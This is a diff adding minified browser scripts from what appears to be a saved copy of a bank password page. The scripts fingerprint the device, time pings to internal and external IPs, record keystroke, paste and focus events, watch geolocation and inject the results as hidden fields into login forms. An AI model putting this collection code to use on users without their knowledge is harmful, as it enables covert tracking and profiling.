+}}else{ProxyCollector.doAjax(ProxyCollector.internalIP,ProxyCollector.setInternalPingTime)
+}};
+forceIE89Synchronicity=function(){if(!ProxyCollector.externalPingTime){setTimeout(forceIE89Synchronicity,100)
+}else{ProxyCollector.doAjax(ProxyCollector.internalIP,ProxyCollector.setInternalPingTime)
+}};
+ProxyCollector.isValidIPAddress=function(h){var e=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
+if(e.test(h)){var g=h.split(".");
+if(parseInt(parseFloat(g[0]))==0){return false
+}for(var f=0;
+f<g.length;
+f++){if(parseInt(parseFloat(g[f]))>255){return false
+}}return true
+}else{return false
+}};
+ProxyCollector.initProxyCollection=function(){if(ProxyCollector.isValidIPAddress(ProxyCollector.externalIP)&&ProxyCollector.isValidIPAddress(ProxyCollector.internalIP)){ProxyCollector.collect()
+}};
+function BlackberryLocationCollector(){var m=this;
+var q=null;
+this.getGeolocationWatchId=function(){return q
+};
+var n=null;
+this.getGeolocationLastPosition=function(){return n
+};
+var r=4;
+this.getGeolocationStatusCode=function(){return r
+};
+var l="";
+this.getGeolocationErrorMessage=function(){return l
+};
+var k={aidMode:2,timeout:180,relevancy:120,expiration:48,alertDebug:false};
+var o=-1;
+var j=0;
+this.getInvokeCount=function(){return j
+};
+this.handleBlackBerryLocationTimeout=function(){if(o!=-1){m.stopWatch();
+r=3;
+if(j===0&&k.aidMode!==0){j++;
+m.startLocationWatch()
+}}};
+this.handlePosition=function(){clearTimeout(o);
+o=-1;
+var c=false;
+if(blackberry.location.latitude===0&&blackberry.location.longitude===0){if(k.alertDebug){alert("Got empty position")
+}if(n===null){r=2
+}}else{var a=null;
+if(blackberry.location.timestamp){a=getTimestampInMillis(blackberry.location.timestamp)
+}else{a=new Date().getTime()
+}var b=new Date().getTime();
+if((b-a)<=(k.expiration*60*60*1000)){if(n===null||a>n.timestamp){var d=n===null?0:n.timestamp;
+if(k.alertDebug){alert("Saved new position. New timestamp: "+a+" Old: "+d)
+}n={timestamp:a,coords:{latitude:blackberry.location.latitude,longitude:blackberry.location.longitude}};
+r=0
+}else{if(k.alertDebug){alert("New position is not saved. New timestamp: "+a+" Old: "+n.timestamp)
+}}}else{if(k.alertDebug){alert("New position is not saved. It is expired: "+((b-a)*1000*60*60)+" hours old")
+}}}if(n!==null){var b=new Date().getTime();
+c=(b-n.timestamp)<(k.relevancy*1000)
+}m.stopWatch();
+if(k.alertDebug){alert("Relevant position? "+c)
+}if((j===0&&k.aidMode!==0)||!c){j++;
+m.startLocationWatch()
+}};
+this.init=function(a,b,d,c){if(a>=0&&a<=2){k.aidMode=a
+}if(b!==null&&b>=90&&b<=300){k.timeout=b
+}if(d!==null&&d>=60&&d<=240){k.relevancy=d
+}if(c!==null&&c>=24&&c<=60){k.expiration=c
+}};
+this.startLocationWatch=function(){if(j===0){blackberry.location.setAidMode(0)
+}else{blackberry.location.setAidMode(k.aidMode)
+}var a=k.timeout*1000;
+o=setTimeout("geoLocator.handleBlackBerryLocationTimeout()",a);
+blackberry.location.onLocationUpdate(m.handlePosition);
+blackberry.location.refreshLocation();
+q=1;
+return true
+};
+this.stopWatch=function(){try{blackberry.location.removeLocationUpdate(m.handlePosition)
+}catch(a){}q=-2
+};
+this.generateGeolocationJSONStruct=function(){var b=null;
+if(n!==null){var a=convertTimestampToGMT(n.timestamp);
+b={GeoLocationInfo:[{Status:r,Longitude:n.coords.longitude,Latitude:n.coords.latitude,Timestamp:a}]}
+}else{b={GeoLocationInfo:[{Status:r}]}
+}return JSON.stringify(b)
+}
+}function detectFields(){var u="form";
+var n="input";
+var j=document.getElementsByTagName("form");
+var w=j.length;
+var m;
+var v;
+var q=[];
+q.push("url="+window.location.href);
+for(var r=0;
+r<w;
+r++){q.push(u+"="+j[r].name);
+m=j[r].getElementsByTagName("input");
+v=m.length;
+for(var s=0;
+s<v;
+s++){if(m[s].type!="hidden"){q.push(n+"="+m[s].name)
+}}}var o=q.join("|");
+return o
+}var SEP="|";
+var PAIR="=";
+var DEV="~";
+function FingerPrint(){var d="3.4.1.0_1";
+var c=new Hashtable();
+c.put("npnul32","def");
+c.put("npqtplugin6","qt6");
+c.put("npqtplugin5","qt5");
+c.put("npqtplugin4","qt4");
+c.put("npqtplugin3","qt3");
+c.put("npqtplugin2","qt2");
+c.put("npqtplugin","qt1");
+c.put("nppdf32","pdf");
+c.put("NPSWF32","swf");
+c.put("NPJava11","j11");
+c.put("NPJava12","j12");
+c.put("NPJava13","j13");
+c.put("NPJava32","j32");
+c.put("NPJava14","j14");
+c.put("npoji600","j61");
+c.put("NPJava131_16","j16");
+c.put("NPOFFICE","mso");
+c.put("npdsplay","wpm");
+c.put("npwmsdrm","drm");
+c.put("npdrmv2","drn");
+c.put("nprjplug","rjl");
+c.put("nppl3260","rpl");
+c.put("nprpjplug","rpv");
+c.put("npchime","chm");
+c.put("npCortona","cor");
+c.put("np32dsw","dsw");
+c.put("np32asw","asw");
+this.deviceprint_version=function(){return d
+};
+this.deviceprint_browser=function(){var a=navigator.userAgent.toLowerCase();
+var b=a+SEP+navigator.appVersion+SEP+navigator.platform;
+return b
+};
+this.deviceprint_software=function(){var a="";
+var q=true;
+var b="";
+var n="";
+var s=navigator.plugins;
+var o=navigator.mimeTypes;
+if(s.length>0){var r="";
+var u="Plugins";
+var m=s.length;
+for(i=0;
+i<m;
+i++){plugin=s[i];
+r=stripFullPath(plugin.filename,u,".");
+if(q===true){n=c.containsKey(r);
+if(n){b+=c.get(r);
+q=false
+}else{b="";
+q=false
+}}else{n=c.containsKey(r);
+if(n){b+=SEP+c.get(r)
+}else{b+=""
+}}}a=stripIllegalChars(b)
+}else{if(o.length>0){n="";
+for(i=0;
+i<o.length;
+i++){mimeType=o[i];
+if(q===true){n=c.containsKey(mimeType);
+if(n){a+=c.get(mimeType)+PAIR+mimeType;
+q=false
+}else{a+="unknown"+PAIR+mimeType;
+q=false
+}}else{n=c.containsKey(mimeType);
+if(n){a+=SEP+c.get(mimeType)+PAIR+mimeType
+}else{b+=""
+}}}}}return a
+};
+this.deviceprint_display=function(){var a="";
+if(self.screen){a+=screen.colorDepth+SEP+screen.width+SEP+screen.height+SEP+screen.availHeight
+}return a
+};
+this.deviceprint_all_software=function(){var m="";
+var r=true;
+var q=navigator.plugins;
+var b=q.length;
+if(b>0){var o="";
+var a="";
+var n="";
+for(i=0;
+i<b;
+i++){var l=q[i];
+a=l.filename;
+a=stripFullPath(a,"Plugins",".");
+if(r===true){o+=a;
+r=false
+}else{o+=SEP+a
+}}m=stripIllegalChars(o)
+}return m
+};
+this.deviceprint_timezone=function(){var a=(new Date().getTimezoneOffset()/60)*(-1);
+var b=new Date();
+if(b.deviceprint_dst()){a--
+}else{}return a
+};
+Date.prototype.deviceprint_stdTimezoneOffset=function(){var b=new Date(this.getFullYear(),0,1);
+var a=new Date(this.getFullYear(),6,1);
+return Math.max(b.getTimezoneOffset(),a.getTimezoneOffset())
+};
+Date.prototype.deviceprint_dst=function(){return this.getTimezoneOffset()<this.deviceprint_stdTimezoneOffset()
+};
+this.deviceprint_language=function(){var j;
+var a=navigator.language;
+var k=navigator.browserLanguage;
+var b=navigator.systemLanguage;
+var h=navigator.userLanguage;
+if(typeof(a)!=="undefined"){j="lang"+PAIR+a+SEP
+}else{if(typeof(k)!=="undefined"){j="lang"+PAIR+k+SEP
+}else{j="lang"+PAIR+""+SEP
+}}if((typeof(b)!=="undefined")){j+="syslang"+PAIR+b+SEP
+}else{j+="syslang"+PAIR+""+SEP
+}if((typeof(h)!=="undefined")){j+="userlang"+PAIR+h
+}else{j+="userlang"+PAIR+""
+}return j
+};
+this.deviceprint_java=function(){var a=(navigator.javaEnabled())?1:0;
+return a
+};
+this.deviceprint_cookie=function(){var a=(navigator.cookieEnabled)?1:0;
+if(typeof navigator.cookieEnabled==="undefined"&&!a){document.cookie="testcookie";
+a=(document.cookie.indexOf("testcookie")!==-1)?1:0
+}return a
+};
+this.deviceprint_appName=function(){var a=navigator.appName;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_appCodeName=function(){var a=navigator.appCodeName;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_online=function(){var a=navigator.onLine;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_opsProfile=function(){var a=navigator.opsProfile;
+return((typeof(a)!="undefined")&&(a!==null))?a:""
+};
+this.deviceprint_userProfile=function(){var a=navigator.userProfile;
+return((typeof(a)!="undefined")&&(a!==null))?a:""
+};
+this.deviceprint_screen_availWidth=function(){var a=screen.availWidth;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_pixelDepth=function(){var a=screen.pixelDepth;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_bufferDepth=function(){var a=screen.bufferDepth;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_deviceXDPI=function(){var a=screen.deviceXDPI;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_deviceYDPI=function(){var a=screen.deviceYDPI;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_logicalXDPI=function(){var a=screen.logicalXDPI;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_logicalYDPI=function(){var a=screen.logicalYDPI;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_fontSmoothingEnabled=function(){var a=screen.fontSmoothingEnabled;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_screen_updateInterval=function(){var a=screen.updateInterval;
+return(typeof(a)!="undefined")?a:""
+};
+this.deviceprint_ping_in=function(){if(ProxyCollector&&ProxyCollector.internalPingTime){return ProxyCollector.internalPingTime
+}else{return""
+}};
+this.deviceprint_ping_ex=function(){if(ProxyCollector&&ProxyCollector.externalPingTime){return ProxyCollector.externalPingTime
+}else{return""
+}}
+}function urlEncode(c){var d=encodeURIComponent(c).replace(/\~/g,"%7E").replace(/\!/g,"%21").replace(/\*/g,"%2A").replace(/\(/g,"%28").replace(/\)/g,"%29").replace(/\'/g,"%27").replace(/\-/g,"%2D").replace(/\_/g,"%5F").replace(/\./g,"%2E");
+return d
+}function encode_deviceprint(){var b=add_deviceprint();
+return urlEncode(b)
+}function decode_deviceprint(){var b=encode_deviceprint;
+return decodeURIComponent(urlEncode(b))
+}function post_deviceprint(){document.forms[0].pm_fp.value=encode_deviceprint();
+return true
+}function post_fingerprints(b){b.deviceprint.value=encode_deviceprint()
+}function add_deviceprint(){BrowserDetect.init();
+var d;
+switch(BrowserDetect.browser){case"Explorer":d=new IE_FingerPrint();
+break;
+case"Firefox":d=new Mozilla_FingerPrint();
+break;
+case"Opera":d=new Opera_FingerPrint();
+break;
+default:d=new FingerPrint()
+}var c="version="+d.deviceprint_version()+"&pm_fpua="+d.deviceprint_browser()+"&pm_fpsc="+d.deviceprint_display()+"&pm_fpsw="+d.deviceprint_software()+"&pm_fptz="+d.deviceprint_timezone()+"&pm_fpln="+d.deviceprint_language()+"&pm_fpjv="+d.deviceprint_java()+"&pm_fpco="+d.deviceprint_cookie();
+c=c+"&pm_fpasw="+d.deviceprint_all_software();
+c=c+"&pm_fpan="+d.deviceprint_appName()+"&pm_fpacn="+d.deviceprint_appCodeName()+"&pm_fpol="+d.deviceprint_online()+"&pm_fposp="+d.deviceprint_opsProfile()+"&pm_fpup="+d.deviceprint_userProfile()+"&pm_fpsaw="+d.deviceprint_screen_availWidth()+"&pm_fpspd="+d.deviceprint_screen_pixelDepth()+"&pm_fpsbd="+d.deviceprint_screen_bufferDepth()+"&pm_fpsdx="+d.deviceprint_screen_deviceXDPI()+"&pm_fpsdy="+d.deviceprint_screen_deviceYDPI()+"&pm_fpslx="+d.deviceprint_screen_logicalXDPI()+"&pm_fpsly="+d.deviceprint_screen_logicalYDPI()+"&pm_fpsfse="+d.deviceprint_screen_fontSmoothingEnabled()+"&pm_fpsui="+d.deviceprint_screen_updateInterval();
+c=c+"&pm_os="+BrowserDetect.OS+"&pm_brmjv="+parseInt(BrowserDetect.version,10)+"&pm_br="+BrowserDetect.browser;
+c=c+"&pm_inpt="+d.deviceprint_ping_in()+"&pm_expt="+d.deviceprint_ping_ex();
+return c
+}function form_add_data(d,e,f){if(d&&d.length>0){d+="&"
+}else{d=""
+}d+=e+"="+escape(f.toString());
+return d
+}function form_add_deviceprint(d,e,f){d=form_add_data(d,e+"d",f);
+return d
+}var HTML5="HTML5";
+var BLACKBERRY="blackberry";
+var UNDEFINED="undefined";
+var GEO_LOCATION_DEFAULT_STRUCT='{"GeoLocationInfo":[{"Status":4}]}';
+var geoLocator=null;
+var geoLocatorStatus=false;
+function detectDeviceCollectionAPIMode(){if(typeof(navigator.geolocation)!=UNDEFINED){return HTML5
+}else{if(typeof(window.blackberry)!=UNDEFINED&&blackberry.location.GPSSupported){return BLACKBERRY
+}else{return UNDEFINED
+}}}function init(j,k,h,g,l){var m=detectDeviceCollectionAPIMode();
+if(m==HTML5){geoLocator=new HTML5LocationCollector();
+geoLocator.init(j,k,h,g);
+return true
+}else{if(m==BLACKBERRY){geoLocator=new BlackberryLocationCollector();
+geoLocator.init(l,k,h,g);
+return true
+}}return false
+}function startCollection(h,j,g,f,k){geoLocatorStatus=init(h,j,g,f,k);
+if(geoLocatorStatus){return geoLocator.startLocationWatch()
+}else{return false
+}}function stopCollection(){if(geoLocatorStatus){geoLocator.stopWatch()
+}}function getGeolocationStruct(){if(geoLocatorStatus){return geoLocator.generateGeolocationJSONStruct()
+}else{return GEO_LOCATION_DEFAULT_STRUCT
+}}function HTML5LocationCollector(){var k=this;
+var m=-1;
+this.getGeolocationWatchId=function(){return m
+};
+var l=null;
+this.getGeolocationLastPosition=function(){return l
+};
+var g=4;
+this.getGeolocationStatusCode=function(){return g
+};
+var j="";
+this.getGeolocationErrorMessage=function(){return j
+};
+var h={accuracy:100,timeout:180,relevancy:120,expiration:48};
+this.getGeolocationConfig=function(){return h
+};
+this.startLocationWatch=function(){var a={enableHighAccuracy:true,timeout:(h.timeout*1000),maximumAge:h.expiration};
+if(navigator.geolocation){m=navigator.geolocation.watchPosition(this.handlePosition,this.handleError,a);
+return true
+}else{g=4
+}return false
+};
+this.init=function(a,b,d,c){if(a!==null&&a>=0&&a<=200){h.accuracy=a
+}if(b!==null&&b>=90&&b<=300){h.timeout=b
+}if(d!==null&&d>=60&&d<=240){h.relevancy=d
+}if(c!==null&&c>=24&&c<=60){h.expiration=c
+}};
+this.handlePosition=function(d){var c=new Date().getTime();
+var b=getTimestampInMillis(d.timestamp);
+if((c-b)<=(h.expiration*60*60*1000)){if(l===null||d.timestamp>l.timestamp||d.coords.accuracy<l.coords.accuracy){l=d;
+g=0
+}}if(l!==null){var a=c-l.timestamp;
+if(a<=(h.relevancy*1000)&&l.coords.accuracy<=h.accuracy){k.stopWatch()
+}}};
+this.generateGeolocationJSONStruct=function(){var b=null;
+if(l!==null){var a=convertTimestampToGMT(l.timestamp);
+b={GeoLocationInfo:[{Status:g,Longitude:l.coords.longitude,Latitude:l.coords.latitude,Altitude:Math.round(l.coords.altitude),HorizontalAccuracy:Math.round(l.coords.accuracy),AltitudeAccuracy:Math.round(l.coords.altitudeAccuracy),Heading:Math.round(l.coords.heading),Speed:Math.round(l.coords.speed),Timestamp:a}]}
+}else{b={GeoLocationInfo:[{Status:g}]}
+}return JSON.stringify(b)
+};
+this.handleError=function(a){switch(a.code){case a.TIMEOUT:k.stopWatch();
+g=3;
+break;
+case a.POSITION_UNAVAILABLE:g=2;
+j=a.message;
+break;
+case a.PERMISSION_DENIED:g=1;
+break;
+case a.UNKNOWN_ERROR:g=2;
+j=a.message;
+break
+}};
+this.stopWatch=function(){navigator.geolocation.clearWatch(m);
+m=-2
+}
+}var UIEventCollector=(function(){var K=null;
+var N=null;
+var Y=null;
+var M=null;
+var F=["output_size_limit"];
+O();
+R();
+function O(b){M={output_size_limit:1024,collection_mode:"partial"};
+if(b){for(p in b){if(!(p._config===undefined)){var a=false;
+for(var c=F.length-1;
+c>=0;
+c--){if(F[c]==p){found=true;
+continue
+}}if(!a){M[p]=b[p]
+}}}}Y=false;
+N=X();
+K={elements:new UIElementList(),events:[],collection_status:0,toString:function(){return"RecordedData: {elements: "+this.elements+", events: "+this.events+"}"
+}};
+R()
+}function J(){var c=V();
+for(var a=0,b=c.length;
+a<b;
+a++){T(c[a])
+}}function V(){var a=[];
+var e=document.getElementsByTagName("input");
+for(var b=0,c=e.length;
+b<c;
+b++){var d=e[b];
+if(G(d)){a.push(d)
+}}return a
+}function G(b){if(b.tagName&&b.tagName.toLowerCase()=="input"){var a=b.getAttribute("type");
+if(a=="text"||a=="checkbox"||a=="checkbox"){return true
+}}return false
+}function X(){var a=(document.createEvent)?document.createEvent("Event"):document.createEventObject();
+var b=a.timeStamp||new Date();
+b=new Date(b);
+if(b.getYear()>2100){b=new Date(b/1000)
+}b=b.getTime();
+return b
+}function T(a){var b=null;
+var c=K.elements;
+var d=c.size();
+var e=Z(a);
+if(!K.elements.containsKey(e)){b=new InteractionElement();
+b.id(e);
+b.type(D(a));
+b.length(a.value?a.value.length:0);
+c.put(b)
+}else{b=c.get(e)
+}return b
+}function P(d){var f=d||window.event;
+var a=W(f);
+if(G(a)){var b=T(a);
+b.incrementEventCount();
+var c=new UIEvent();
+c.index(b.index());
+c.type(aa(f));
+var e=I(f);
+c.offset(e-N);
+K.events.push(c)
+}return true
+}function E(a){var b=a||window.event;
+if(H(b)){var c={target:W(b),type:"paste"};
+return P(c)
+}else{return P(b)
+}}function H(b){if(b.type=="keydown"){var a=b.which||b.charCode||b.keyCode;
+var c=(typeof KeyboardEvent!="undefined"&&a==KeyboardEvent.DOM_VK_V)||a==118||a==86;
+if(c&&(b.ctrlKey||b.metaKey)){return true
+}}return false
+}function W(a){return a.target?a.target:a.srcElement
+}function I(b){var a;
+if(b.timeStamp&&b.timeStamp!==0){a=b.timeStamp;
+if(new Date(a).getYear()>2100){a=a/1000
+}}else{a=new Date().getTime()
+}return a
+}function L(a){}function Q(){J();
+var b=K.elements;
+for(var e=b.size();
+e>=1;
+e--){var c=b.getByIndex(e);
+var d=c.id();
+var a=document.getElementById(d);
+if(!a){var f=document.getElementsByName(d);
+if(f.length>0){a=f[0]
+}}if(a&&a.value){c.length(a.value.length)
+}}}function S(d){var f=d||window.event;
+var a=d.target;
+if(a.nodeType==1){var c=a.getElementsByTagName("form");
+for(var e=c.length-1;
+e>=0;
+e--){var b=c[e];
+b.onsubmit=recordFormSubmitEvent
+}}}function R(){var a=P;
+var b=document;
+if(b.addEventListener){b.addEventListener("keydown",E,false);
+b.addEventListener("paste",a,false);
+b.addEventListener("focus",a,true);
+b.addEventListener("blur",a,true)
+}else{if(b.attachEvent){b.onkeydown=E;
+b.onfocusin=a;
+b.onfocusout=a
+}}}function U(){return private_config
+}function aa(a){if(a.type=="keydown"){return UIEvent.KeyDown
+}else{if(a.type=="submit"){return UIEvent.Submit
+}else{if(a.type=="paste"){return UIEvent.Paste
+}else{if(a.type=="focus"||a.type=="focusin"){return UIEvent.Focus
+}else{if(a.type=="blur"||a.type=="focusout"){return UIEvent.Blur
+}else{return UIEvent.Unknown
+}}}}}}function C(a){if(a==UIEvent.KeyDown){return"keydown"
+}else{if(a==UIEvent.Submit){return"submit"
+}else{if(a==UIEvent.Focus){return"focus"
+}else{if(a==UIEvent.Blur){return"blur"
+}else{if(a==UIEvent.Paste){return"paste"
+}else{return"unknown"
+}}}}}}function D(a){return a.nodeName+(a.type?(":"+a.type):"")
+}function Z(a){return a.id?a.id:(a.name?a.name:a.nodeName)
+}return{addElement:function(a){return T(a)
+},getEventType:function(a){return aa(a)
+},getEventCode:function(a){return C(a)
+},getRecordedData:function(){return K
+},getElementType:function(a){return D(a)
+},getElementId:function(a){return Z(a)
+},initEventCollection:function(a){O(a)
+},getConfig:function(){return M
+},serialize:function(){Q();
+var c=this.getRecordedData();
+var m=c.elements;
+var B=[];
+for(var e=0;
+e<m.length;
+e++){B[e]=false
+}var A=c.events;
+var q=c.collection_status;
+var ac=this.getConfig().collection_mode=="partial";
+var f=this.getConfig().output_size_limit;
+var v=A.length;
+var o="@";
+var ad=";";
+var a=",";
+var g=2*o.length;
+var d=(""+N)+a+(""+q);
+var r=1;
+g+=r;
+g+=a.length;
+g+=d.length;
+var u="";
+L("serializing elements ");
+for(var n=m.size();
+n>0;
+n--){var b=m.getByIndex(n);
+var j=b.serialize()+ad;
+L("elementsStr.length: "+u.length);
+if(ac&&((g+u.length+j.length)>f)){Y=true;
+break
+}var s=b.type().match("INPUT:checkbox");
+if(s==null){if(b.length()>0&&b.eventCount()==0){L("collecting element without input: "+b);
+u=j+u
+}}}g+=u.length;
+var y="";
+L("serializing events ");
+while(v--){var k=A[v];
+var l=k.index();
+var w=k.serialize()+ad;
+var j=m.getByIndex(l).serialize()+ad;
+var z=w.length;
+if(!B[l]){z+=j.length
+}L("eventsStr.length: "+y.length);
+if(ac&&((g+y.length+z)>f)){Y=true;
+break
+}L("collecting event: "+k);
+if(!B[l]){u=j+u;
+g+=j.length;
+L("also adding element event: "+j)
+}B[l]=true;
+y=w+y
+}if(u.length>0){u=u.substring(0,u.length-1)
+}if(y.length>0){y=y.substring(0,y.length-1)
+}var h=Y?1:0;
+var x=u+o+y+o+h+a+d;
+return x
+}}
+})();
+function UIEvent(){var b=(this===window)?{}:this;
+b.index=function(a){if(arguments.length===0){return b._index
+}else{b._index=arguments[0]
+}};
+b.offset=function(a){if(arguments.length===0){return b._offset
+}else{b._offset=arguments[0]
+}};
+b.type=function(a){if(arguments.length===0){return b._type
+}else{b._type=arguments[0]
+}};
+b.serialize=function(){var a=",";
+var d="0";
+return b.index()+a+b.type()+a+d
+};
+b.toString=function(){return"UIEvent: [index: "+b.index()+", type: "+b.type()+", offset: "+b.offset()+"]"
+}
+}UIEvent.Unknown=0;
+UIEvent.KeyDown=1;
+UIEvent.Submit=2;
+UIEvent.Focus=3;
+UIEvent.Blur=4;
+UIEvent.Paste=5;
+function InteractionElement(){var b=(this===window)?{}:this;
+b._eventCount=0;
+b.id=function(a){if(arguments.length===0){return b._id
+}else{b._id=arguments[0]
+}};
+b.index=function(a){if(arguments.length===0){return b._index
+}else{b._index=arguments[0]
+}};
+b.length=function(a){if(arguments.length===0){return b._length
+}else{b._length=arguments[0]
+}};
+b.type=function(a){if(arguments.length===0){return b._type
+}else{b._type=arguments[0]
+}};
+b.incrementEventCount=function(){b._eventCount++
+};
+b.eventCount=function(){return b._eventCount
+};
+b.serialize=function(){var a=",";
+var d=b.index();
+return b.index()+a+d+a+b.type()+a+b.length()
+};
+b.toString=function(){return"InteractionElement: [id: "+b.id()+", index: "+b.index()+", length: "+b.length()+", type: "+b.type()+"]"
+}
+}function UIElementList(){var e=(this===window)?{}:this;
+var d=new Hashtable();
+var f=new Hashtable();
+e.get=function(a){return d.get(a)
+};
+e.getByIndex=function(a){return f.get(a)
+};
+e.containsKey=function(a){return d.containsKey(a)
+};
+e.indexByKey=function(a){return get(a).index()
+};
+e.size=function(){return d.size()
+};
+e.put=function(a){var b=a.id();
+if(!d.containsKey(b)){d.put(b,a);
+var c=d.size();
+a.index(c);
+f.put(c,a)
+}};
+e.toString=function(){return"[size: "+d.size()+", names: ["+d+"], indexes: ["+f+"]]"
+}
+}function activeXDetect(e){var f=null;
+try{f=document.body.getComponentVersion("{"+e+"}","ComponentID")
+}catch(d){}return(f!==null)?f:false
+}function stripIllegalChars(h){t="";
+h=h.toLowerCase();
+var g=h.length;
+for(var f=0;
+f<g;
+f++){var e=h.charAt(f);
+if(e!="\n"&&e!="/"&&e!="\\"){t+=e
+}else{if(e=="\n"){t+="n"
+}}}return t
+}function stripFullPath(k,n,m){var q=n;
+var o=m;
+var l=k;
+var j=l.lastIndexOf(q);
+if(j>=0){filenameLen=l.length;
+l=l.substring(j+q.length,filenameLen)
+}var r=l.indexOf(o);
+if(r>=0){l=l.slice(0,r)
+}return l
+}var BrowserDetect={init:function(){this.browser=this.searchString(this.dataBrowser)||"an unknown browser";
+this.version=this.searchVersion(navigator.userAgent)||this.searchVersion(navigator.appVersion)||"an unknown version";
+this.OS=this.searchString(this.dataOS)||"an unknown OS"
+},searchString:function(l){var k=l.length;
+for(var o=0;
+o<k;
+o++){var h=l[o];
+var n=h.string;
+var m=h.prop;
+var j=h.identity;
+this.versionSearchString=h.versionSearch||j;
+if(n){if(n.toLowerCase().indexOf(h.subString.toLowerCase())!==-1){return j
+}}else{if(m){return j
+}}}},searchVersion:function(d){var e=d.toLowerCase().indexOf(this.versionSearchString.toLowerCase());
+if(e===-1){return
+}var f=d.substring(e+this.versionSearchString.length);
+if(f.indexOf(" ")===0||f.indexOf("/")===0){f=f.substring(1)
+}return parseFloat(f)
+},dataBrowser:[{string:navigator.userAgent,subString:"Chrome",identity:"Chrome"},{string:navigator.userAgent,subString:"OmniWeb",versionSearch:"OmniWeb/",identity:"OmniWeb"},{string:navigator.userAgent.toLowerCase(),subString:"opera",identity:"Opera",versionSearch:"version"},{string:navigator.vendor,subString:"Apple",identity:"Safari",versionSearch:"Version"},{string:navigator.userAgent,subString:"mobile safari",identity:"Mobile Safari",versionSearch:"mobile safari"},{string:navigator.vendor,subString:"iCab",identity:"iCab"},{string:navigator.vendor,subString:"KDE",identity:"Konqueror"},{string:navigator.userAgent,subString:"Firefox",identity:"Firefox"},{string:navigator.vendor,subString:"Camino",identity:"Camino"},{string:navigator.userAgent.toLocaleLowerCase(),subString:"blackberry",identity:"BlackBerry",versionSearch:"0/"},{string:navigator.userAgent,subString:"Netscape",identity:"Netscape"},{string:navigator.userAgent,subString:"MSIE",identity:"Explorer",versionSearch:"MSIE"},{string:navigator.userAgent,subString:"Gecko",identity:"Mozilla",versionSearch:"rv"},{string:navigator.userAgent,subString:"Mozilla",identity:"Netscape",versionSearch:"Mozilla"}],dataOS:[{string:navigator.userAgent,subString:"BlackBerry",identity:"BlackBerry"},{string:navigator.userAgent.toLowerCase(),subString:"android",identity:"Android"},{string:navigator.userAgent,subString:"Symbian",identity:"Symbian"},{string:navigator.platform,subString:"Mac",identity:"Mac"},{string:navigator.userAgent,subString:"iPhone",identity:"iPhone/iPod"},{string:navigator.platform,subString:"Linux",identity:"Linux"},{string:navigator.userAgent,subString:"Windows CE",identity:"Windows CE"},{string:navigator.platform,subString:"Win",identity:"Windows"}]};
+function convertTimestampToGMT(c){var d=c;
+if(!(c instanceof Date)){d=new Date(c)
+}offsetFromGmt=d.getTimezoneOffset()*60000;
+return d.getTime()+offsetFromGmt
+}function getTimestampInMillis(c){var d=c;
+if(c instanceof Date){d=c.getTime()
+}return d
+}function debug(b){};
+//-->
+</script>
+<!--RSAIPError -z-->
+
+<!--3param -a-->
+<link rel="stylesheet" href="MBB_Pass_files/mediaelementplayer.css">
+<script src="MBB_Pass_files/mediaelement-and-player.js"></script>
+
+<script>
+	$('video').mediaelementplayer();
+</script>
+
+<script>
+<!--
+// initializes UI event recording when page loads
+	
+	ProxyCollector.externalIP="104.88.71.47";
+	
+	if(window.addEventListener) {
+		window.addEventListener('load',UIEventCollector.initEventCollection, false);
+		window.addEventListener('load',ProxyCollector.initProxyCollection, false);
+	} else if(window.attachEvent) {
+		window.attachEvent('onload',UIEventCollector.initEventCollection);
+		window.attachEvent('onload',ProxyCollector.initProxyCollection);
+	} else {
+		window.onload = UIEventCollector.initEventCollection;
+		window.onload = ProxyCollector.initProxyCollection;
+	}
+//-->
+</script>
+<!--3param -z-->
+
+<!--RSAIPError -a-->
+<script type="text/javascript">
+<!--
+var url = window.location.pathname;
+var pageId = url.substring(url.lastIndexOf('/')+1,url.lastIndexOf("."));
+var dom_data_collection = new DomDataCollection();
+dom_data_collection.config.functionsToExclude = ['myFunction1','myFunction2'];
+dom_data_collection.initFunctionsToExclude();
+dom_data_collection.startInspection();
+var dp = encode_deviceprint();
+var jsEventsString = UIEventCollector.serialize();
+var Encoded = dp;
+var Decoded = decodeURIComponent(dp);
+var domElementsString = dom_data_collection.domDataAsJSON();
+		
+var theFormNameOuter = document.getElementsByTagName("form")[0];
+var theFormNameInner = document.getElementsByTagName("form")[1];
+var theFormName = theFormNameOuter;
+var theFormAction = "No";
+var theFormActionValOuter = theFormNameOuter.attributes["action"].value;
+var theIndex3 = theFormActionValOuter.indexOf("Login"); 
+
+if (theIndex3 != -1)
+{
+	theFormAction = "Yes";
+	post_deviceprint();
+}	
+
+if(typeof theFormNameInner != "undefined")
+{
+	theFormName = theFormNameInner;
+	var theFormActionValInner = theFormNameInner.attributes["action"].value;
+	var theIndex1 = theFormActionValInner.indexOf("Confirm"); 
+	var theIndex2 = theFormActionValInner.indexOf("Verify"); 
+
+	if (theIndex1 != -1 && theIndex2 == -1)
+	{
+		theFormAction = "Yes";
+	}	
+}
+
+if (theFormAction == "Yes")
+{
+	var element = document.createElement("input");       
+	element.setAttribute("type", "hidden");     
+	element.setAttribute("value", domElementsString);     
+	element.setAttribute("name", "domElementsString");         
+	theFormName.appendChild(element);   
+	
+	var element1 = document.createElement("input");       
+	element1.setAttribute("type", "hidden");     
+	element1.setAttribute("value", jsEventsString);     
+	element1.setAttribute("name", "jsEventsString");         
+	theFormName.appendChild(element1);   
+	
+	var element2 = document.createElement("input");       
+	element2.setAttribute("type", "hidden");     
+	element2.setAttribute("value", pageId);     
+	element2.setAttribute("name", "pageId");         
+	theFormName.appendChild(element2);   
+	
+	var element3 = document.createElement("input");       
+	element3.setAttribute("type", "hidden");     
+	element3.setAttribute("value", theFormAction);     
+	element3.setAttribute("name", "theFormAction");         
+	theFormName.appendChild(element3);   
+}
+//-->
+</script>
+<script type="text/javascript" src="post.js"></script>
+
+<!--RSAIPError -z-->
+
+
+
